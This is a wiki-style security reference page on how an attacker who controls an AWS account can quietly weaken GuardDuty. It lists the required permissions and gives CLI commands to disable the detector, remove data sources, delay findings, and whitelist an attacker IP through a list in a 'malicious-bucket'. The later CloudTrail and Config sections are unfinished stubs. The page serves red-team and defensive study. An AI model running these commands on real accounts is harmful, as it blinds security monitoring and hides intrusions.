---
author: Ben Leembruggen
title: Modify Security Services
description: Update key AWS logging and detection services to hamper response activities.
enableEditBtn: true
editBaseURL: https://github.com/Hacking-the-Cloud/hackingthe.cloud/blob/main/content
---

Where an account has been successfully compromised, an attacker can modify detection and logging services in an account to reduce the likelihood of their actions triggering an alert.  Whilst outright deleting services can trigger alerts from services like GuardDuty, modifying key attributes of these services is less likely to raise alerts and can render them close to useless depending on the scenario.  The actions available to an attacker will largely depend on the compromised permissions available to the attacker, the AWS service architecture (using delegated admins or organisational services can limit your ability to make configuration changes in the tenant accounts) and the presence of higher level controls like Service Control Policies. 

## GuardDuty
### Misconfiguring the Detector
An attacker could modify an existing GuardDuty detector in the account, to remove sources of telemetry or lessen its effectiveness.

Configuration changes may include a combination of:
- Disabling the detector altogether.
- Removing Kubernetes and s3 as data sources, which removes all [S3 Protection](https://docs.aws.amazon.com/guardduty/latest/ug/guardduty_finding-types-s3.html) and [Kubernetes alerts](https://docs.aws.amazon.com/guardduty/latest/ug/guardduty_finding-types-kubernetes.html).
- Increasing the publishing frequency to 6 hours, as opposed to as low as 15 minutes.


#### Required Permissions to execute:
- guardduty:ListDetectors
- guardduty:UpdateDetector

Example Commands
```
# Disabling the detector
aws guardduty update-detector \
    --detector-id 12abc34d567e8fa901bc2d34eexample \
    --no-enable 

# Removing s3 and kubernetes as log sources
aws guardduty update-detector \
    --detector-id 12abc34d567e8fa901bc2d34eexample \
    --data-sources S3Logs={Enable=false},Kubernetes={AuditLogs={Enable=false}}

# Increase publishing time to 6 hours
aws guardduty update-detector \
    --detector-id 12abc34d567e8fa901bc2d34eexample \
    --finding-publishing-frequency SIX_HOURS
```

### Modifying Trusted IP Lists
An attacker could create or update GuardDuty's [Trusted IP list](https://docs.aws.amazon.com/guardduty/latest/ug/guardduty_upload-lists.html), including their own IP on the list.  Any IPs in a trusted IP list will not have any Cloudtrail or VPC flow log alerts raised against them. 

<i> DNS findings are exempt from the Trusted IP list </i>

#### Required Permissions to execute:
- guardduty:ListIPSet 
- guardduty:CreateIPSet (To create new list)
- guardduty:UpdateIPSet (To update an existing list)

<i> Depending on the level of stealth required, s3 upload permissions to a bucket in the account may also be appropriate. </i>


Example Commands
```
aws guardduty update-ip-set \
    --detector-id 12abc34d567e8fa901bc2d34eexample \
    --ip-set-id 24adjigdk34290840348exampleiplist \
    --location https://malicious-bucket.s3-us-east-1.amazonaws.com/customiplist.text \
    --activate
```

## Cloudtrail


GuardDuty
- 

(Not available if in a managed account)

Config
- Recorders
- Aggregator
https://docs.aws.amazon.com/config/latest/developerguide/stop-start-recorder.html

CloudTrail
